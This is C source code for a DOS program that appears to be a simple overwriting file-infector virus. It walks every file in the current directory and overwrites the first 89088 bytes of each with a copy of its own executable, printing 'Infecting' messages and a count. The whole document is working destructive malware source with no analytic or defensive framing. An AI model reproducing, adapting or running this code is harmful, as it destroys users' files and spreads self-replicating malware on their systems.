#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <dir.h>
#include <conio.h>
#include <dos.h>

FILE *Class, *vClass;
int owned = 0, a = 0;
unsigned long x;
char buff[256];
struct ffblk ffblk;
clock_t st, end;

main() {
	st = clock();
	clrscr(); 

	owned=(findfirst("*.*", &ffblk, 0));

	while(!owned) {
		Class = fopen(_argv[0], "rb");
		vClass = fopen(ffblk.ff_name, "rb+");
		if (vClass == NULL)
			goto next;

		x = 89088;
		printf("Infecting %s\n", ffblk.ff_name);

		while (x > 256) {
			printf("xx :: %ul\n", x);
			fread(buff, 256, 1, Class);
			fwrite(buff, 256, 1, vClass);
			x -= 256;
		}
		fread(buff, x, 1, Class);
		fwrite(buff, x, 1, vClass);
		a++;
		next: fcloseall();
		owned = findnext(&ffblk);
	}
	end = clock();
	printf("Infected %d files in %f sec", a, (end-st)/CLK_TCK);
	getch();
	return (0);
}
